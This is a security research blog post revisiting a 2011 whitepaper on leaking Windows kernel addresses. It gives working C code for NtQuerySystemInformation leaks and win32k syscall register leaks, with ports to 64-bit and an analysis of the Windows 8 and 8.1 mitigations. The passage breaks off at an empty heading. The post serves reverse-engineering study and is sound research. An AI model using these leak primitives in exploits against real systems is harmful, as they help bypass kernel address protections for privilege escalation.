# Revisiting Windows Security Hardening Through Kernel Address Protection

Back in 2011 when Windows 7 Service Pack 1 was king of the hill and I was just starting to learn to program (via Harvard's epic [CS50](https://cs50.harvard.edu/)), [j00ru](https://twitter.com/j00ru) published a whitepaper on various ways to access Windows kernel pointers from User Mode: [Windows Security Hardening Through Kernel Address Protection](http://j00ru.vexillium.org/blog/04_12_11/Windows_Kernel_Address_Protection.pdf). 

I decided to revisit the techniques outlined in the paper, get versions of them working on Windows 7 and then look into if they work on Windows 8/8.1/10 and if not look into how the functions have been modified in the newer versions of Windows. A lot of this has been covered elsewhere but I learned a reasonable amount doing this and it was a fun reversing exercise so hopefully people will find it useful :) 

For each example I will walk through writing a working implementation for Windows 7 32 bit and running it, then porting it to 64 bit Windows and notes on any changes to the feature being used, if it's found to no longer work on newer versions of Windows.

All the Visual Studio projects for each technique can be grabbed in a single repository on [Github](https://github.com/sam-b/windows_kernel_address_leaks).

## Windows System Information classes
The [NtQuerySystemInformation](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724509(v=vs.85).aspx) is a classic and very well known undocumented function which, using reverse engineered details, can be used to gather information about the state of the Windows kernel. It is defined on MSDN as follows:
<pre>
NTSTATUS WINAPI NtQuerySystemInformation(
  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
  _Inout_   PVOID                    SystemInformation,
  _In_      ULONG                    SystemInformationLength,
  _Out_opt_ PULONG                   ReturnLength
);
</pre>
The first argument is a value in the SYSTEM\_INFORMATION\_CLASS enum, this the value which decides what information is returned. Some of the values for this enum can be found in winternl.h and others have been reverse engineered (for example [here's the wine projects implementation](https://github.com/wine-mirror/wine/blob/master/include/winternl.h#L840)). In j00ru's paper he looked at 4 of the enum values which will be elaborated on individually below. 

The 2nd and 3rd parameters are a pointer to a structure for the output data, which varies depending on the SystemInformationClass value, and it's size. The final parameter is used to return how much data was written to the output structure.

In order to avoid repeating code for each of the SystemInformationClass values, I'll give the code for actually defining and calling NtQuerySystemInformation here. First of all we'll include the standard Visual Studio project header and a full import of Windows.h which defines many of the Windows specific structures and functions we'll need to use.

<pre>
#include "stdafx.h"
#include &lt;windows.h>
</pre>

We'll also need to define the NyQuerySystemInformation function in such a way that we can cast a pointer to it and then call it.
<pre>
typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
);
</pre>

Finally we'll need to locate the NtQuerySystemInformation function within ntdll, this is done by getting a HANDLE to ntdll, finding the procedure address within it and then quickly checking that it has been found successfully.
<pre>
HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
if (query == NULL) {
	printf("GetProcAddress() failed.\n");
	return 1;
}
</pre>
Once this code has run the query variable can be called like a function.
## #Windows 7 32 bit
## ##SystemModuleInformation
The first SystemInformationClass value looked at is SystemModuleInformation, the data returned when this value is used includes the addresses all currently loaded drivers are loaded at in kernel space, their names and sizes.

First of all we need to define the SYSTEM\_INFORMATION\_CLASS enum value we will pass to NtQuerySystemInformation later, in this case it's 11 as shown below.
<pre>
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;
</pre>

Next we need to define the structure that NtQuerySystemInformation will load information into when called with SystemModuleInformation (taken from [reactos/wine](https://doxygen.reactos.org/db/ded/reactos_2wine_2winternl_8h_source.html) line 2129 onward).
<pre>
#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	BYTE                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
</pre>

As you can see the SYSTEM_MODULE structure includes the ImageBaseAddress, ImageSize and Name fields which is what we're interested in. In order to find out how much memory we need to allocate we have to call NtQuerySystemInformation with the SystemModuleInformation enum value and a NULL output pointer, when this is done it will load the number of bytes needed into the ReturnLength parameter.

<pre>
ULONG len = 0;
query(SystemModuleInformation, NULL, 0, &len);
</pre>

Now that we know how much memory is needed we can allocate a SYSTEM\_MODULE\_INFORMATION structure of the right size and call NtQuerySystemInformation again.
<pre>
PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
if (pModuleInfo == NULL) {
	printf("Could not allocate memory for module info.\n");
	return 1;
}

query(SystemModuleInformation, pModuleInfo, len, &len);
if (len == 0) {
	printf("Failed to retrieve system module information.\r\n");
	return 1;
}
</pre>
After verifying that everything has returned without any errors, we can use the ModulesCount field to iterate over the SYSTEM_MODULE array and print the key details about each module.
<pre>
for (int i = 0; i < pModuleInfo->ModulesCount; i++) {
	PVOID kernelImageBase = pModuleInfo->Modules[i].ImageBaseAddress;
	PCHAR kernelImage = (PCHAR)pModuleInfo->Modules[i].Name;
	printf("Module name %s\t", kernelImage);
	printf("Base Address 0x%X\r\n", kernelImageBase);
}
</pre>

Building and then running the code gave the following output.
![](/content/images/2017/02/SystemModuleInformation_info_leak_poc.PNG)
The full code for this example (including the changes for running it on 64 bit Windows discussed later) can be grabbed from [Github](https://github.com/sam-b/windows_kernel_address_leaks/tree/master/NtQuerySysInfo_SystemModuleInformation).

## ##SystemHandleInformation
The second SystemInformationClass value mentioned in j00ru's paper is SystemHandleInformation, this gives the HANDLEs and pointers to every object from every process in kernel memory, including all [Token](https://msdn.microsoft.com/en-us/library/windows/desktop/aa374909(v=vs.85).aspx) objects. I'll be using the extended version of SystemHandleInformation since as discussed in the paper, the original version only gives 16 bits of the HANDLE value which may not be enough in some circumstances. First of all we again define the correct SYSTEM\_INFORMATION\_CLASS value.

<pre>
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemExtendedHandleInformation = 64
} SYSTEM_INFORMATION_CLASS;
</pre>

Next we need to define the output structure (Taken from [Process Hacker](http://processhacker.sourceforge.net/doc/ntexapi_8h_source.html) line 1595 onward).
<pre>
typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;
</pre>

As you can see the output structure includes the HandleValue for each object and the Object field which is a pointer to its location in memory. 

NtQuerySystemInformation has a weird API for using this SystemInformationClass value, instead of returning the memory needed when called with a NULL pointer it just returns the [NTSTATUS code](https://msdn.microsoft.com/en-gb/library/cc704588.aspx) 0xC0000004. This is the code for  STATUS\_INFO\_LENGTH\_MISMATCH which is returned if too little memory has been allocated for the output to be written to. In order to deal with this I allocate a small amount of memory for the output and then keep calling NtQuerySystemInformation with double the memory each time until it returns a different status code.

<pre>
ULONG len = 20;
NTSTATUS status = (NTSTATUS)0xc0000004;
PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
do {
	len *= 2;
	pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);

	status = query(SystemExtendedHandleInformation, pHandleInfo, len, &len);

} while (status == (NTSTATUS) 0xc0000004);
</pre>

Once enough memory has been allocated the function should return successfully and we can iterate over the output as before, printing the values we are interested in.

<pre>
for (int i = 0; i < pHandleInfo->HandleCount; i++) {
	PVOID object = pHandleInfo->Handles[i].Object;
	HANDLE handle = pHandleInfo->Handles[i].HandleValue;
	HANDLE pid = pHandleInfo->Handles[i].UniqueProcessId;
	printf("PID: %d\t", pid);
	printf("Object 0x%X\t", object);
	printf("Handle 0x%X\r\n", handle);
}
</pre>

Building and then running the code gave me the following output :)
![](/content/images/2017/02/SystemHandleInformation_info_leak_poc.PNG)

The full code as well as the changes for it to run on 64 bit Windows (which are discussed later) can be found on  [Github](https://github.com/sam-b/windows_kernel_address_leaks/tree/master/NtQuerySysInfo_SystemHandleInformation).

## ##SystemLockInformation
The third SystemInformationClass value examined in j00ru's paper is SystemLockInformation, this returns the details for and address in kernel memory of every Lock object that currently exists. Once again we'll first define the correct SYSTEM\_INFORMATION\_CLASS value.
<pre>
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemLockInformation = 12
} SYSTEM_INFORMATION_CLASS;
</pre>
Next we need to define the output structure, for this I took the structure definition from j00ru's paper and assumed the container structure with the LocksCount information would follow the pattern the other structures have.
<pre>
typedef struct _SYSTEM_LOCK {
	PVOID	Address;
	USHORT  Type;
	USHORT  Reserved1;
	ULONG	ExclusiveOwnerThreadId;
	ULONG	ActiveCount;
	ULONG	ContentionCount;
	ULONG	Reserved2[2];
	ULONG	NumberOfSharedWaiters;
	ULONG	NumberOfExclusiveWaiters;
} SYSTEM_LOCK, *PSYSTEM_LOCK;

typedef struct SYSTEM_LOCK_INFORMATION {
	ULONG              LocksCount;
	SYSTEM_LOCK        Locks[1];
} SYSTEM_LOCK_INFORMATION, *PSYSTEM_LOCK_INFORMATION;
</pre>
The key value to note for the SYSTEM_LOCK structure is the Address field which is a pointer to the object in kernel memory.

Much like using SystemExtendedHandleInformation we can't just get NtQuerySystemInformation to give us the needed output buffer size to call it and resort to calling it in a loop util it stops giving the length mismatch error code.
<pre>
PSYSTEM_LOCK_INFORMATION pLockInfo = NULL;
ULONG len = 20;
NTSTATUS status = (NTSTATUS)0xc0000004;

do {
	len *= 2;
	pLockInfo = (PSYSTEM_LOCK_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	status = query(SystemLockInformation, pLockInfo, len, &len);
} while (status == (NTSTATUS)0xc0000004);
</pre>
Once enough memory has been allocated and the output has been written, we can iterate over the output, printing the fields of interest.
<pre>
for (int i = 0; i < pLockInfo->LocksCount; i++) {
	PVOID lockAddress = pLockInfo->Locks[i].Address;
	USHORT lockType = (USHORT)pLockInfo->Locks[i].Type;
	printf("Lock Address 0x%X\t", lockAddress);
	printf("Lock Type 0x%X\r\n", lockType);
}
</pre>
This can be then be successfully run on Windows 7 32 bit:
![](/content/images/2017/02/SystemLockInformation_info_leak_poc.PNG)

The full code including the changes for 64 bit Windows can be grabbed from [Github](https://github.com/sam-b/windows_kernel_address_leaks/tree/master/NtQuerySysInfo_SystemLockInformation).

## ##SystemExtendedProcessInformation

The final SystemInformationClass value mentioned in j00ru's paper is SystemExtendedProcessInformation, this returns detailed information about all processes and threads running on the system, including the addresses of each threads user and kernel mode stacks. We start by defining the correct SYSTEM\_INFORMATION\_CLASS value.

<pre>
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemSessionProcessInformation = 57
} SYSTEM_INFORMATION_CLASS;
</pre>
Next we need to define all of the output structures, these were taken from the [BOINC project](http://boinc.berkeley.edu/android-boinc/boinc/lib/diagnostics_win.h) at Berkeley. We could probably get away with just leaving some of the fields as raw pointers but since it had been pretty thoroughly reversed it seemed worth using the full structure definitions.
<pre>
typedef LONG       KPRIORITY;
typedef struct _CLIENT_ID {
	DWORD          UniqueProcess;
	DWORD          UniqueThread;
} CLIENT_ID;

typedef struct _UNICODE_STRING {
	USHORT         Length;
	USHORT         MaximumLength;
	PWSTR          Buffer;
} UNICODE_STRING;

typedef struct _VM_COUNTERS {
	SIZE_T         PeakVirtualSize;
	SIZE_T         VirtualSize;
	ULONG          PageFaultCount;
	SIZE_T         PeakWorkingSetSize;
	SIZE_T         WorkingSetSize;
	SIZE_T         QuotaPeakPagedPoolUsage;
	SIZE_T         QuotaPagedPoolUsage;
	SIZE_T         QuotaPeakNonPagedPoolUsage;
	SIZE_T         QuotaNonPagedPoolUsage;
	SIZE_T         PagefileUsage;
	SIZE_T         PeakPagefileUsage;
} VM_COUNTERS;

typedef enum _KWAIT_REASON
{
	Executive = 0,
	FreePage = 1,
	PageIn = 2,
	PoolAllocation = 3,
//SNIP
	WrRundown = 36,
	MaximumWaitReason = 37
} KWAIT_REASON;

typedef struct _SYSTEM_THREAD_INFORMATION{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	LONG BasePriority;
	ULONG ContextSwitches;
	ULONG ThreadState;
	KWAIT_REASON WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION
{
	SYSTEM_THREAD_INFORMATION ThreadInfo;
	PVOID StackBase;
	PVOID StackLimit;
	PVOID Win32StartAddress;
	PVOID TebAddress;
	ULONG Reserved1;
	ULONG Reserved2;
	ULONG Reserved3;
} SYSTEM_EXTENDED_THREAD_INFORMATION, *
PSYSTEM_EXTENDED_THREAD_INFORMATION;

typedef struct _SYSTEM_EXTENDED_PROCESS_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER SpareLi1;
	LARGE_INTEGER SpareLi2;
	LARGE_INTEGER SpareLi3;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	ULONG UniqueProcessId;
	ULONG InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	PVOID PageDirectoryBase;
	VM_COUNTERS VirtualMemoryCounters;
	SIZE_T PrivatePageCount;
	IO_COUNTERS IoCounters;
	SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1];
} SYSTEM_EXTENDED_PROCESS_INFORMATION, *PSYSTEM_EXTENDED_PROCESS_INFORMATION;
</pre>

The key values we are interested in from these structures are the StackBase and StackLimit fields which give the start of a threads kernel mode stack and it's limit.

Once more NtQuerySystemInformation won't just tell us how much memory we need to allocate, so we call it in a loop.

<pre>
ULONG len = 20;
NTSTATUS status = NULL;
PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
do {
	len *= 2;	
	pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	status = query(SystemSessionProcessInformation, pProcessInfo, len, &len);
} while (status == (NTSTATUS)0xc0000004);
</pre>
Once the function has been successfully called we can print out the StackBase and StackLimit values for every thread running on the system :D 

In order to do this we iterate over all the ProcessInfo structures and then iterate over each thread contained within, printing the values of interest.
<pre>
while (pProcessInfo->NextEntryOffset != NULL) {
	for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
		PVOID stackBase = pProcessInfo->Threads[i].StackBase;
		PVOID stackLimit = pProcessInfo->Threads[i].StackLimit;
		printf("Stack base 0x%X\t", stackBase);
		printf("Stack limit 0x%X\r\n", stackLimit);
	}
	pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
}
</pre>
Below you can see the output of this being run on Windows 7 32 bit:
![](/content/images/2017/02/NtQuerySysInfo_SystemProcessInformation_windows7_32bit.PNG)

The full code for this example and the changes needed to run it on 64 bit systems can be found on [Github](https://github.com/sam-b/windows_kernel_address_leaks/tree/master/NtQuerySysInfo_SystemProcessInformation).

## #Windows 8 64 bit
In order to make use these information leaks on Windows 8 64 bit, some minor changes needed to be made to each example, these are outlined below. All of these were found purely by debugging the leak code itself to work out how what was in memory and the structures were mismatched.
## ##SystemModuleInformation
Only two minor changes need to be made, first of all the ImageBaseAddress pointer can be found 32 bits later on in the SYSTEM_MODULE structure so a padding variable was added, we aren't interested in what's contained in the extra 32 bits so I didn't bother digging into this.
<pre>
typedef struct SYSTEM_MODULE {
	ULONG           Reserved1;
	ULONG           Reserved2;
#ifdef _WIN64
	ULONG		Reserved3;
#endif
	PVOID           ImageBaseAddress;
</pre>
Additionally the printf statement used to print the base addresses once NtQuerySystemInformation has been called needed to be updated to print 64 bit pointers.
<pre>
printf("Base Addr 0x%llx\r\n", kernelImageBase);
</pre>

Once built this could be success run on Windows 8 64 bit:
![](/content/images/2017/02/NtQuerySysInfo_SystemModuleInformation_windows8_64bit.PNG)
The final code is on [Github](https://github.com/sam-b/windows_kernel_address_leaks/tree/master/NtQuerySysInfo_SystemModuleInformation).
## ##SystemHandleInformation
Literally all I needed to do for SystemHandleInformation was swap out a print statement and everything ran fine.
<pre>
#ifdef _WIN64
	printf("Object 0x%llx\t", object);
#else
	printf("Object 0x%X\t", object);
#endif
</pre>
Running on Windows 8 64 bit:

![](/content/images/2017/02/NtQuerySysInfo_SystemHandleInformation_windows8_64bit.PNG)

The final code is on [Github](https://github.com/sam-b/windows_kernel_address_leaks/tree/master/NtQuerySysInfo_SystemHandleInformation).
## ##SystemLockInformation
To get SystemLockInformation working on 64 bit Windows I had to add another padding variable, there didn't seem to be anything being put in the variable when I was testing but it might have some use I haven't noticed. The field sizes don't add up for it be an alignment issue.

<pre>
	ULONG	Reserved2[2];
#ifdef _WIN64
	ULONG	Reserved3;
#endif
</pre>
I also had to modify the printf statement that was printing the lock address to support 64 bit addresses.
<pre>
#ifdef _WIN64
	printf("Lock Address 0x%llx\t", lockAddress);
#else
	printf("Lock Address 0x%X\t", lockAddress);
#endif
</pre>
After this it ran fine on Windows 8 64 bit:
![](/content/images/2017/02/NtQuerySysInfo_SystemLockInformation_windows8_64bit.PNG)
The final code is on [Github](https://github.com/sam-b/windows_kernel_address_leaks/tree/master/NtQuerySysInfo_SystemLockInformation).
## ##SystemExtendedProcessInformation
The changes needed for SystemExtendedProcessInformation were also minimal, 128 bits of padding were added to the SYSTEM\_THREAD\_INFORMATION struct - this was being used for something but I have no idea what.
<pre>
#ifdef _WIN64
	ULONG Reserved[4];
#endif
}SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;
</pre>

Additionally the printf statements that dealt with addresses needed to be updated as before.
<pre>
#ifdef _WIN64
	printf("Stack base 0x%llx\t", stackBase);
	printf("Stack limit 0x%llx\r\n", stackLimit);
#else
	printf("Stack base 0x%X\t", stackBase);
	printf("Stack limit 0x%X\r\n", stackLimit);
#endif
</pre>
With these minor changes the code ran fine on Windows 8 64 bit: 
![](/content/images/2017/02/NtQuerySysInfo_SystemProcessInformation_windows8_64bit.PNG)
The final code is on [Github](https://github.com/sam-b/windows_kernel_address_leaks/tree/master/NtQuerySysInfo_SystemProcessInformation).
## #Windows 8.1 64 bit onward
I had a slight advantage looking at this leak on Windows 8.1 as I'd read a blogpost from [Alex Ionescu](http://www.alex-ionescu.com/?p=82) a while earlier and as such I knew to try running the binary in a slightly different way. In Windows Vista the idea of [Integrity Levels](https://msdn.microsoft.com/en-us/library/bb625963.aspx) was introduced, this causes all processes to run at one of the six integrity levels shown below.
![](/content/images/2017/02/windows_integrity_levels.PNG)
Processes with higher integrity levels can access more system resources, for example sandboxed processes are generally run at Low Integrity and have minimal access to the rest of the system. Much more detail can be found on the MSDN page I linked above.

I created a low integrity copy of cmd.exe following the instructions found [here](https://msdn.microsoft.com/en-us/library/bb625960.aspx). When I tried to run any of the NtQuerySystemInformation binaries in this command prompt I'd just get the error code 0xC0000022:
![](/content/images/2017/02/SystemLockInformation_windows8_1_low_integrity.PNG)
This is the [NTSTATUS code](https://msdn.microsoft.com/en-gb/library/cc704588.aspx) for STATUS\_ACCESS\_DENIED defined as:
<pre>
A process has requested access to an object but has not been granted those access rights.
</pre>

However when ran in a medium integrity command prompt the binaries all ran fine:
![](/content/images/2017/02/SystemLockInformation_windows8_1_medium_integrity.PNG)
This means that an integrity level check must have been added to the function. You can check the integrity level processes are running at using procexp from SysInternals (see the last column):
![](/content/images/2017/02/windows_8_1_integrity_levels.PNG)
I started looking into what had changed in NtQuerySystemInformation between Windows 8 and 8.1 to add this check. By looking at the NtQuerySystemInformation function in IDA, I found that it relied on calling the 'ExpQueryInformationProcess' function.
![](/content/images/2017/02/ntquerysys_ida.PNG)
Diffing two versions of ntoskrnl.exe (using the awesome [Diaphora](https://github.com/joxeankoret/diaphora)) I found that this function had undergone significant changes between the two OS releases.
![](/content/images/2017/02/expquerysysteminformation_diff_stats.PNG)
Scrolling through the diffed assembly for the two implementations it didn't take long to find a call to 'ExIsRestrictedCaller' which had been added, looking at the xrefs to this function it was clear it was mostly being called in ExpQuerySystemInformation as well as a few times in potentially related functions.
![](/content/images/2017/02/restricted_check_refs.PNG)
I took a look at the function itself and my annotated assembly can be seen below.
![](/content/images/2017/02/restricted_caller_disasm_comments-2.png)
My general understanding of how this function works is the following:
<ol>
<li>Checks if an unknown value passed to it in ecx is 0, if it is then returns 0</li>
<li>Increments the reference count for the calling processes token using <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff551930(v=vs.85).aspx">PsReferencePrimaryToken</a></li>
<li>Reads the TokenIntegrityLevel for the calling processes token into a local variable using <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff556690(v=vs.85).aspx">SeQueryInformationToken</a></li>
<li>Decrements the reference count for the calling processes token using <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff557724(v=vs.85).aspx">ObDereferenceObject</a></li>
<li>Check if SeQueryInformationToken returned an error code, if it did then return 1</li>
<li>If SeQueryInformationToken succeeded, compare the read token integrity level to 0x2000 which is the value for medium integrity level</li>
<li>If the token integrity level was below 0x2000 return 1, otherwise return 0</li>
</ol>
Alex Ionescu has a properly reversed version of this function on his [blog](http://www.alex-ionescu.com/?p=82). Each time the function is called if it returns 1 then the calling function will return the error code seen earlier.

## Win32k.sys System Call Information Disclosure
## # Windows 7 32 bit
This issue was originally discovered by j00ru several months before he published the whitepaper and is covered in more depth in the original [blog post](http://j00ru.vexillium.org/?p=762). 

The issue was that ~20 system calls within win32k.sys were defined with return values of less than 32 bits, for example VOID or USHORT, and as a result not clearing the eax register before returning. For various reasons before the calls returned kernel addresses ended up in eax and as such these were either fully leaked or partially leaked by reading eax immediately after making the call. 

For example the NtUserModifyUserStartupInfoFlags fully leaked the address of the ETHREAD structure, below you can see that just before the function returns UserSessionSwitchLeaveCrit is called, this appears to load a pointer to ETHREAD into eax which isn't modified before the function returns, leaving the address intact.

![](/content/images/2017/02/NtUserModifyUserStartupInfoFlags_infoleak.PNG)
To use these system calls to leak the addresses we first need to add the standard includes and Winddi which defines some of the GDI (Graphics Device Interface) structures used by functions we'll be calling.
<pre>
#include "stdafx.h"
#include &lt;Windows.h>
#include &lt;Winddi.h>
</pre>
I decided to call the system calls by using their user space wrappers, in this case user32.dll and gdi32.dll, as such I needed to get the offsets of the functions within the DLL's. In order to do this I dropped the dll's into IDA, rebased the disassembly to 0 and filtered the function list to find the functions I was targetting. The functions start addresses are the offsets into the dll's I needed. 

I picked one function which leaked ETHREAD fully, one which leaked it partially and then the same again for W32THREAD which could be leaked in a similar way.
<pre>
//0x64D4B - NtUserModifyUserStartupInfoFlags
typedef DWORD(NTAPI * lNtUserModifyUserStartupInfoFlags)(DWORD Set, DWORD Flags);
//0xA2F4 - NtUserGetAsyncKeyState
typedef DWORD(NTAPI *lNtUserGetAsyncKeyState)(DWORD key);

//0x47123 - NtGdiFONTOBJ_vGetInfo
typedef VOID(NTAPI * lNtGdiFONTOBJ_vGetInfo)(FONTOBJ *pfo,ULONG cjSize,FONTINFO *pfi);
//0x47263 - NtGdiPATHOBJ_vEnumStartClipLines
typedef VOID(NTAPI * lNtGdiPATHOBJ_vEnumStartClipLines)(PATHOBJ *ppo, CLIPOBJ *pco, SURFOBJ *pso, LINEATTRS *pla);
</pre>
To call these functions we first need a handle to the DLL's they are found in, first up we get a handle to user32.dll.
<pre>
HMODULE hUser32 = LoadLibraryA("user32.dll");
if (hUser32 == NULL) {
	printf("Failed to load user32");
	return 1;
}
</pre>
If this is successful we can add the first functions offset to the HMODULE value to get the functions entry point and cast it to the correct type.
<pre>
lNtUserGetAsyncKeyState pNtUserGetAsyncKeyState = (lNtUserGetAsyncKeyState)((DWORD_PTR)hUser32 + 0xA2F4);
</pre>
We then call the function and use inline assembly to grab the value which was left in eax and print it.
<pre>
pNtUserGetAsyncKeyState(20);
unsigned int ethread = 0;
__asm {
	mov ethread, eax;
}
printf("NtUserGetAsyncKeyState ETHREAD partial disclosure: 0x%X\r\n", ethread);
</pre>
We then do the same again for NtUserModifyUserStartupInfoFlags.
<pre>
lNtUserModifyUserStartupInfoFlags pNtUserModifyUserStartupInfoFlags = (lNtUserModifyUserStartupInfoFlags)((DWORD_PTR)hUser32 + 0x64D4B);

pNtUserModifyUserStartupInfoFlags(20, 12);
unsigned ethread_full = 0;
__asm {
	mov ethread_full, eax;
}
printf("NtUserModifyUserStartupInfoFlags ETHREAD full disclosure: 0x%X\r\n", ethread_full);
</pre>
Next up we need to call the functions which disclose the W32THREAD pointer, these are both defined in gdi32.dll so we get a handle to the DLL and call the functions as before.
<pre>
HMODULE hGDI32 = LoadLibraryA("gdi32.dll");
if (hGDI32 == NULL) {
	printf("Failed to load gdi32");
	return 1;
}

lNtGdiFONTOBJ_vGetInfo pNtGdiFONTOBJ_vGetInfo = (lNtGdiFONTOBJ_vGetInfo)((DWORD_PTR)hGDI32 + NtGdiFONTOBJ_vGetInfoAddress);
FONTOBJ surf = { 0 };
FONTINFO finfo = { 0 };
pNtGdiFONTOBJ_vGetInfo(&surf, 123, &finfo);

long int w32thread = 0;
__asm {
	mov w32thread, eax;
}


printf("NtGdiEngUnLockSurface W32THREAD full disclosure: 0x%X\r\n", w32thread);


lNtGdiPATHOBJ_vEnumStartClipLines pNtGdiPATHOBJ_vEnumStartClipLines = (lNtGdiPATHOBJ_vEnumStartClipLines)((DWORD_PTR)hGDI32 + 0x47263);
PATHOBJ pathobj = { 0 };
CLIPOBJ pco = { 0 }; 
SURFOBJ pso = { 0 };
LINEATTRS pla = { 0 };
pNtGdiPATHOBJ_vEnumStartClipLines(&pathobj, &pco, &pso, &pla);
w32thread = 0;
__asm {
	mov w32thread, eax;
}
printf("NtGdiPATHOBJ_vEnumStartClipLines W32THREAD full disclosure: 0x%X\r\n", w32thread);
</pre>
Once the code is built and ran, we can see the addresses being leaked :D
![](/content/images/2017/02/syscall_address_leak_windows7_32bit.PNG)

## #Windows 8 64 bit onward
The first thing that had to be done to get the code running on Windows 8 was to update the function offsets to match the new host VM's binaries. Note that the NtGdiFONTOBJ_vGetInfo function address is missing because the function was not defined in the Windows 8 VM's version of gdi32.
<pre>
//win8, 64bit
#define NtUserModifyUserStartupInfoFlagsAddress 0x263F0
#define NtUserGetAsyncKeyStateAddress 0x3B30
#define NtGdiPATHOBJ_vEnumStartClipLinesAddress 0x67590
</pre>
The second issue is that Visual Studio doesn't support inline assembly for code targeting amd64, so I ended up adding a rather brief file named 'asm_funcs.asm' which consisted of the following:
<pre>
_DATA SEGMENT
_DATA ENDS
_TEXT SEGMENT

PUBLIC get_rax

get_rax PROC
ret
get_rax ENDP
_TEXT ENDS
END
</pre>
Effectively all this does is define a single function named 'get_rax' which will do nothing but return, returning the value held in rax due to the calling convention. 

Some minor config changes also had to be made to the Visual Studio project to make it compile the included assembly, this essentially consists of right clicking on the project in the solution explorer, going to 'Build Dependencies'->'Build Customizations...' and then ticking the 'masm' option in the dialogue window that comes up. Elias Bachaalany has more details on this [here](http://lallouslab.net/2016/01/11/introduction-to-writing-x64-assembly-in-visual-studio/).

This function then be imported into the main file by declaring is an external function.
<pre>
extern "C" unsigned long long get_rax();
</pre>

Finally the variables we were reading eax into need to changed to 64 bit sized variables and any printf statements should be updated. 

The final code can be found on [Github](https://github.com/sam-b/windows_kernel_address_leaks/tree/master/Syscalls).

After all that work we can run the code on 64 bit systems and see that this issue was fixed in Windows 8! :(
![](/content/images/2017/02/syscall_address_leak_windows8_64bit.PNG)

This fix is referenced in the kernel section of Matt Miller's [talk](https://media.blackhat.com/bh-us-12/Briefings/M_Miller/BH_US_12_Miller_Exploit_Mitigation_Slides.pdf) at Black Hat USA 2012 on Windows 8 exploit mitigation improvements:

![](/content/images/2017/02/matt_miller_windows_8_exploit_mitigation_slides_syscall_change.PNG)

The method used to fix these issues was very straight forward, by looking at the versions of win32.sys from Windows 7 vs Windows 8 (shown below) we can see that the functions are now implemented in a way that all of rax is set to a new value after calling sensitive functions. For example in both the functions that leaked ETHREAD I looked at, UserSessionSwitchLeaveCrit was responsible for the leaked address being in rax/eax before returning and this has now been fixed.

NtUserGetAsyncKeyState: Windows 8 implementation on the left, Windows 7 on the right. Previously this partially leaked the ETHREAD address as only the first 16 bits of eax were being modified before the function returned, now movsx is being used which will zero out the higher bits instead of leaving them intact.
![](/content/images/2017/02/NtUserGetAsyncKeyState_windows_8_64bit_onwards_code_diff_mitigation.PNG)

NtUserModifyUserStartupInfoFlags: Windows 8 implementation on the left, Windows 7 on the right. Previously this leaked the full ETHREAD address due to eax not being modified at all before returning, now eax is explicitly set to be 1.
![](/content/images/2017/02/NtUserModifyUserStartupInfoFlags_windows_8_64bit_onwards_code_diff_mitigation.PNG)

## Descriptor Tables
## #Windows 7 32 bit
